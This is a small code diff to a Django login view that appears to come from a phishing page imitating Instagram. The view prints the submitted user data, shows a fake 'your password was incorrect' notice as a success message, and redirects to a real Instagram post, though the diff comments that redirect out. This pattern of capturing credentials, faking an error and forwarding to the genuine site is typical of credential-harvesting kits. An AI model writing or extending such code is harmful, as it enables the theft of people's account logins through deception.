@@ -18,6 +18,6 @@ def login_view(request):
         print(user_data)
         success_message = 'Sorry, your password was incorrect. Please double-check your password.'
         messages.success(request, success_message)
-        return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')
+        # return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')
 
     return render(request, 'myapp/index.html', {'success_message': success_message})
